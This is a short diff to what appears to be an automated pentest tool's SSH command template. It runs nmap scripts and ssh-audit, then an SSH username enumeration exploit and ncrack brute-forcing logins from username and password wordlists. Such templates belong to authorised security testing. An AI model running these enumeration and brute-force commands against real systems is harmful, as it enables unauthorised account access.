@@ -1,4 +1,4 @@
-nmap.exe -Pn -p _port_ --script=banner,ssh-audit,ssh-auth-methods,sshv1 -oA "_output_/ftp/_target_._port_.script" _target_  > /dev/null 2>&1 & tail --pid=$! -f /dev/null 2>&1
+nmap.exe -Pn -p _port_ --script=banner,ssh-auth-methods,sshv1 -oA "_output_/ssh/_target_._port_.script" _target_  > /dev/null 2>&1 & tail --pid=$! -f /dev/null 2>&1
 ssh-audit _target_:_port_ > "_output_/ssh/_target_._port_.sshaudit.txt"
 sshUsernameEnumExploit --port _port_ --userList "_realport_/brute-force/common_usernames.small.txt" --outputFormat list --outputFile "_output_/ssh/_target_._port_.sshUsernameEnumExploit" _target_
 ncrack  -v -U "_realport_/brute-force/usernames.ssh.txt" -P "_realport_/brute-force/passwords.ssh.txt" -p ssh:_port_ -oA "_output_/ssh/_target_._port_.ncrack" _target_
